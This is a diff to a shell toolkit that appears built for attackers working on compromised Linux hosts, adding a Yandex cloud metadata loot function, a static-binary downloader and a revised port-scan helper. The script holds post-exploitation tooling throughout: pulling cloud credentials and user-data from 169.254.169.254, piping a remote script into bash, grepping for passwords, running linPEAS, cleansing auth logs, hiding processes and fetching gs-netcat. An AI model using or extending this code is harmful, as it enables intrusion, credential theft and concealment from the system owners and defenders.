@@ -41,6 +41,28 @@ _hs_dep() {
 HS_ERR()  { echo -e >&2  "${CR}ERROR: ${CDR}$*${CN}"; }
 HS_WARN() { echo -e >&2  "${CY}WARN: ${CDM}$*${CN}"; }
 HS_INFO() { echo -e >&2 "${CDG}INFO: ${CDM}$*${CN}"; }
+
+
+xhelp_scan() {
+    echo -e "\
+Scan 1 port:
+    scan 22 192.168.0.1
+Scan some ports:
+    scan 22,80,443 192.168.0.1
+Scan all ports:
+    scan - 192.168.0.1
+Scan all ports on a range of IPs
+    scan - 192.168.0.1-254"
+}
+
+xhelp_dbin() {
+    echo -e "\
+dbin               - List all options
+dbin search nmap   - Search for nmap
+dbin install nmap  - install nmap
+dbin list          - List ALL binaries"
+}
+
 xlog() { local a=$(sed "/${1:?}/d" <"${2:?}") && echo "$a" >"${2:?}"; }
 xsu() {
     local name="${1:?}"
@@ -405,8 +427,19 @@ hgrep() {
     grep -HEronasi  ".{,16}${1:-password}.{,32}" .
 }
 
+dbin() {
+    local cdir tfn
+    { [ -n "${XHOME}" ] && [ -f "${XHOME}/dbin" ]; } || { bin dbin || return; }
+
+    cdir="${XHOME}/.dbin"
+    [ ! -d "${cdir}" ] && { mkdir "${cdir}" || return; }
+    DBIN_CACHEDIR="${cdir}" DBIN_TRACKERFILE="${cdir}/tracker.json" DBIN_INSTALL_DIR="${XHOME}" "${XHOME}/dbin" "$@"
+    [ $# -eq 0 ] && { HS_INFO "Example: ${CDC}dbin install nmap"; }
+}
+
 bin() {
     local arch="$(uname -m)"
+    local arch_alt
     local os="$(uname -s)"
     local a
     local single="${1}"
@@ -419,7 +452,8 @@ bin() {
         unset is_showhelp
     }
     a="${arch}"
-
+    [ "$arch" == "x86_64" ] && arch_alt="amd64"
+    [ "$arch" == "aarch64" ] && arch_alt="arm64"
     hs_mkxhome
 
     bin_dl() {
@@ -455,6 +489,10 @@ bin() {
     bin_dl base64       "https://bin.ajam.dev/${a}/Baseutils/coreutils/base64"
     bin_dl busybox      "https://bin.ajam.dev/${a}/Baseutils/busybox/busybox"
     bin_dl curl         "https://bin.ajam.dev/${a}/curl"
+
+    bin_dl "dbin"       "https://github.com/xplshn/dbin/releases/latest/download/dbin_${arch_alt}"
+    # export DBIN_INSTALL_DIR="${XHOME}"
+
     bin_dl fd           "https://bin.ajam.dev/${a}/fd-find"
 
     bin_dl gs-netcat    "https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_${os,,}-${arch}"
@@ -583,7 +621,7 @@ _loot_aws() {
 
     str="$(curl -SsfL -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/user-data 2>/dev/null)"
     [ -n "$str" ] && [[ "$str" != *Lightsail* ]] && {
-        echo -e "${CB}AWS user_data (config)${CDY}${CF}"
+        echo -e "${CB}AWS user-data (config)${CDY}${CF}"
         echo "$str"
         echo -en "${CN}"
     }
@@ -603,6 +641,27 @@ _loot_aws() {
             echo -e "${CN}"
         done
     }
+}
+
+_loot_yandex() {
+    local str
+
+    [ -n "$_HS_NOT_YC" ] && return
+    [ -n "$_HS_NO_SSRF_169" ] && return
+
+    str="$(timeout 4 bash -c "$(declare -f dl);dl 'http://169.254.169.254/latest/user-data'" 2>/dev/null)" || {
+        [ "$?" -eq 124 ] && _HS_NO_SSRF_169=1
+        unset str
+    }
+    [ -z "$str" ] && {
+        _HS_NOT_YC=1
+        return 255
+    }
+
+    echo -e "${CB}Yandex Cloud user-data (config)${CDY}${CF}"
+    echo "$str"
+    echo -en "${CN}"
+    echo -e "${CW}TIP: ${CDC}curl -SsfL 'http://169.254.169.254/computeMetadata/v1/instance/?alt=text&recursive=true' -H 'Metadata-Flavor:Google'${CN}"
 }
 
 lootlight() {
@@ -706,6 +765,7 @@ loot() {
     # SSRF
     _loot_openstack
     _loot_aws
+    _loot_yandex
     [ -z "$_HS_NO_SSRF_169" ] && {
         # Found an SSRF
         echo -e "${CW}TIP:${CN} See ${CB}${CUL}https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf${CN}"
@@ -743,7 +803,8 @@ lpe() {
 }
 
 ws() {
-    dl https://thc.org/ws | bash
+    # dl https://thc.org/ws | bash
+    dl 'https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/whatserver.sh' | bash
 }
 
 _hs_resize() {
@@ -945,10 +1006,12 @@ _scan_single() {
 
 # scan <port> <IP or file> ...
 scan() {
-    local port="${1:?}"
+    local port
 
-    shift 1
+    [ $# -lt 2 ] && { xhelp_scan; return 255; }
     _hs_dep nmap
+    port="${1:?}"
+    shift 1
     for ip in "$@"; do
         _scan_single "$port" "$ip"
     done
@@ -1011,19 +1074,12 @@ hs_init_shell() {
     fi
 }
 
-xhelp_scan() {
-    echo -e "\
-Scan all ports:
-    scan - 192.168.0.1
-Scan all ports on a range of IP.s
-    scan - 192.168.0.1-254"
-}
-
 # shellcheck disable=SC2120
 # Output help
 xhelp() {
 
     [[ "$1" == "scan" ]] && { xhelp_scan; return; }
+    [[ "$1" == "dbin" ]] && { xhelp_dbin; return; }
 
     echo -en "\
 ${CDC} xlog '1\.2\.3\.4' /var/log/auth.log   ${CDM}Cleanse log file
@@ -1047,13 +1103,14 @@ ${CDC} crt foobar.com                        ${CDM}Query crt.sh for all sub-doma
 ${CDC} dns foobar.com                        ${CDM}Resolv domain name to IPv4
 ${CDC} rdns 1.2.3.4                          ${CDM}Reverse DNS from multiple public databases
 ${CDC} cn <IP> [<port>]                      ${CDM}Display TLS's CommonName of remote IP
-${CDC} scan <port> [<IP or file> ...]        ${CDM}TCP Scan a port + IP ${CN}${CF}[scan 22,443,445 10.0.0.1-254]
+${CDC} scan <port> [<IP or file> ...]        ${CDM}TCP Scan a port + IP ${CN}${CF}[xhelp scan]
 ${CDC} hide <pid>                            ${CDM}Hide a process
 ${CDC} np <directory>                        ${CDM}Display secrets with NoseyParker ${CN}${CF}[try |less -R]
 ${CDC} loot                                  ${CDM}Display common secrets
 ${CDC} lpe                                   ${CDM}Run linPEAS
 ${CDC} ws                                    ${CDM}WhatServer - display server's essentials
-${CDC} bin                                   ${CDM}Download useful static binaries ${CN}${CF}[bin nmap]
+${CDC} bin [<binary>]                        ${CDM}Download useful static binaries ${CN}${CF}[bin nmap]
+${CDC} dbin                                  ${CDM}Download static binary ${CN}${CF}[xhelp dbin]
 ${CDC} zapme [<name>]                        ${CDM}Hide args of current shell as <name> + all child processes
 ${CDC} lt, ltr, lss, lssr, psg, lsg, ...     ${CDM}Common useful commands
 ${CDC} xhelp                                 ${CDM}This help"
